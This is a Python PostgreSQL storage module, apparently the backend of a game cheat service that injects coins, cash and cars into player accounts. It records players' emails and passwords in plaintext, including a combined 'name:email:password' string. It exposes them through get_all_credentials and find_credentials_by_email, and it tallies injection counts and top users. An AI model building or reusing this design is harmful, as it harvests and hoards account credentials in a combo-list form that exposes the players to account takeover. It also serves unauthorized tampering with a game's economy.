#!/usr/bin/env python3
"""Shared PostgreSQL action, credential, tracker, and live-counter storage."""

from __future__ import annotations

import time
from typing import Any, Dict, Optional

from postgres_db import connection


def _jsonb(value):
    from psycopg.types.json import Jsonb

    return Jsonb(value)


def record_credentials(player_name: str, email: str, password: str, web_uid=None) -> Dict[str, Any]:
    now = time.time()
    entry = {
        "player_name": player_name or "Unknown",
        "email": email or "",
        "password": password or "",
        "credential_string": f"{player_name or 'Unknown'}:{email or ''}:{password or ''}",
        "web_uid": web_uid,
        "recorded_at": now,
        "recorded_at_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now)),
    }
    with connection() as conn, conn.transaction():
        conn.execute(
            """
            INSERT INTO backlog_credentials
                (player_name, email, password, web_uid, recorded_at, payload)
            VALUES (%s, %s, %s, %s, %s, %s)
            """,
            (entry["player_name"], entry["email"], entry["password"], str(web_uid) if web_uid is not None else None, now, _jsonb(entry)),
        )
    return entry


def get_all_credentials():
    with connection() as conn:
        rows = conn.execute("SELECT payload FROM backlog_credentials ORDER BY recorded_at").fetchall()
    return [dict(row["payload"]) for row in rows]


def find_credentials_by_email(email: str):
    with connection() as conn:
        rows = conn.execute(
            "SELECT payload FROM backlog_credentials WHERE lower(email) = lower(%s) ORDER BY recorded_at",
            (email or "",),
        ).fetchall()
    return [dict(row["payload"]) for row in rows]


def log_action(
    email: str,
    action: str,
    action_title: str,
    success: bool,
    message: str = "",
    web_uid=None,
    player_name: Optional[str] = None,
    extra: Optional[Dict[str, Any]] = None,
    *,
    categories: Dict[str, set],
    defaults: Dict[str, int],
) -> Dict[str, Any]:
    now = time.time()
    event = {
        "email": email or "unknown",
        "player_name": player_name or "Unknown",
        "action": action,
        "action_title": action_title,
        "success": bool(success),
        "message": message or "",
        "web_uid": web_uid,
        "timestamp": now,
        "timestamp_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now)),
    }
    if extra:
        event["extra"] = extra
    with connection() as conn, conn.transaction():
        conn.execute(
            """
            INSERT INTO backlog_actions
                (email, player_name, action, action_title, success, message,
                 web_uid, event_time, payload)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
            """,
            (
                event["email"],
                event["player_name"],
                action,
                action_title,
                bool(success),
                event["message"],
                str(web_uid) if web_uid is not None else None,
                now,
                _jsonb(event),
            ),
        )
    record_live_action(action, bool(success), amount=1, categories=categories, defaults=defaults)
    return event


def get_all_actions(limit: Optional[int] = None, email_filter: Optional[str] = None):
    sql = "SELECT payload FROM backlog_actions"
    params = []
    if email_filter:
        sql += " WHERE lower(email) = lower(%s)"
        params.append(email_filter)
    sql += " ORDER BY event_time DESC"
    if limit:
        sql += " LIMIT %s"
        params.append(max(1, int(limit)))
    with connection() as conn:
        rows = conn.execute(sql, tuple(params)).fetchall()
    return [dict(row["payload"]) for row in rows]


def get_tracker() -> Dict[str, Any]:
    with connection() as conn:
        rows = conn.execute(
            """
            SELECT email,
                   (array_agg(player_name ORDER BY event_time DESC))[1] AS player_name,
                   COUNT(*)::bigint AS total_actions,
                   COUNT(*) FILTER (WHERE success)::bigint AS successful_actions,
                   COUNT(*) FILTER (WHERE NOT success)::bigint AS failed_actions,
                   MIN(event_time) AS first_seen,
                   MAX(event_time) AS last_action
              FROM backlog_actions
             GROUP BY email
            """
        ).fetchall()
        action_rows = conn.execute(
            """
            SELECT email, action, COUNT(*)::bigint AS count
              FROM backlog_actions
             GROUP BY email, action
            """
        ).fetchall()
    action_maps: Dict[str, Dict[str, int]] = {}
    for row in action_rows:
        action_maps.setdefault(row["email"], {})[row["action"]] = int(row["count"])
    tracker = {}
    for row in rows:
        last = float(row["last_action"])
        tracker[row["email"]] = {
            "email": row["email"],
            "player_name": row["player_name"] or "Unknown",
            "total_actions": int(row["total_actions"]),
            "successful_actions": int(row["successful_actions"]),
            "failed_actions": int(row["failed_actions"]),
            "actions_by_type": action_maps.get(row["email"], {}),
            "first_seen": float(row["first_seen"]),
            "last_action": last,
            "last_action_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(last)),
        }
    return tracker


def get_user_stats(email: str):
    return get_tracker().get(email)


def ensure_live_counters(defaults: Dict[str, int]) -> None:
    now = time.time()
    with connection() as conn, conn.transaction():
        for key, value in defaults.items():
            conn.execute(
                """
                INSERT INTO live_counters (counter_key, counter_value, updated_at)
                VALUES (%s, %s, %s)
                ON CONFLICT (counter_key) DO NOTHING
                """,
                (key, int(value), now),
            )


def get_live_stats(defaults: Dict[str, int]) -> Dict[str, Any]:
    ensure_live_counters(defaults)
    with connection() as conn:
        rows = conn.execute("SELECT counter_key, counter_value, updated_at FROM live_counters").fetchall()
    data = dict(defaults)
    updated_at = None
    for row in rows:
        data[row["counter_key"]] = int(row["counter_value"])
        updated_at = max(updated_at or 0, float(row["updated_at"]))
    data["total_actions"] = sum(int(data.get(key, 0)) for key in defaults)
    data["updated_at"] = updated_at
    return data


def record_live_action(action: str, success: bool, amount: int, *, categories: Dict[str, set], defaults: Dict[str, int]) -> None:
    if not success or int(amount) <= 0 or action in {"login", "logout"}:
        return
    keys = []
    if action in categories["coin"]:
        keys.append("coin_injections")
    if action in categories["cash"]:
        keys.append("cash_injections")
    if action in {"premium_car_inject", "bulk_car_inject"}:
        keys.append("premium_car_injections")
    if action == "event_car_inject":
        keys.append("event_car_injections")
    if action in categories["unlock"] or not keys:
        keys.append("player_mod_unlocks")
    ensure_live_counters(defaults)
    now = time.time()
    with connection() as conn, conn.transaction():
        for key in set(keys):
            conn.execute(
                """
                UPDATE live_counters
                   SET counter_value = counter_value + %s, updated_at = %s
                 WHERE counter_key = %s
                """,
                (int(amount), now, key),
            )


def get_global_stats() -> Dict[str, Any]:
    tracker = get_tracker()
    with connection() as conn:
        credential_count = int(conn.execute("SELECT COUNT(*)::bigint AS n FROM backlog_credentials").fetchone()["n"])
    total_actions = sum(user["total_actions"] for user in tracker.values())
    total_success = sum(user["successful_actions"] for user in tracker.values())
    total_failed = sum(user["failed_actions"] for user in tracker.values())
    action_types: Dict[str, int] = {}
    for user in tracker.values():
        for action, count in user["actions_by_type"].items():
            action_types[action] = action_types.get(action, 0) + int(count)
    ranking = sorted(tracker.values(), key=lambda item: item["total_actions"], reverse=True)[:10]
    return {
        "total_users": len(tracker),
        "total_credentials": credential_count,
        "total_actions": total_actions,
        "total_successful": total_success,
        "total_failed": total_failed,
        "action_types": action_types,
        "top_users": ranking,
    }
